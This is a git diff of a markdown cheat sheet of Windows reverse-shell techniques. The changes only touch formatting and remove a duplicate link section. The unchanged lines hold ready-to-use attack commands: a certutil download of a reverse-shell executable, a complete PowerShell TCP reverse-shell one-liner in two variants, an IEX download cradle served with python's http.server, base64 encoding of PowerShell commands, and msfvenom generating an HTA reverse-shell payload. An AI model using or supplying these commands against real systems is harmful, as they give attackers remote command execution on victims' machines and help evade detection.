@@ -17,17 +17,10 @@ Now you can setup your listener (multi/handler or normal netcat listener).
 And lastly from target Windows machine you'll execute certutil.
 
 ```
-cmd.exe /C certutil -urlcache -split -f http://<LHOST>/rev.exe rev.exe
+cmd.exe /C certutil -urlcache -split -f http://LHOST/rev.exe rev.exe
 ```
 
 For more: https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
-
-
-## Windows one-liners
-
-```text
-https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
-```
 
 ## powershell.exe
 
@@ -35,11 +28,11 @@ https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
 $client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-```
+```powershell
 $client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-```text
+```bash
 # serve shell.ps1
 python3 -m http.server <port>
 
@@ -49,7 +42,7 @@ powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LPORT>/shell
 
 ### Creating encoded powershell commands on linux
 
-```text
+```bash
 echo -n "IEX (New-Object Net.WebClient).downloadstring('<thing_to_execute>')" | iconv --to-code UTF-16LE | base64 -w 0
 ```
 
@@ -57,7 +50,7 @@ echo -n "IEX (New-Object Net.WebClient).downloadstring('<thing_to_execute>')" | 
 
 Runs .hta \(HTML Application\) files
 
-```text
+```bash
 # first, we generate hta-psh file with msfvenom
 msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f hta-psh -o <file>.hta
 
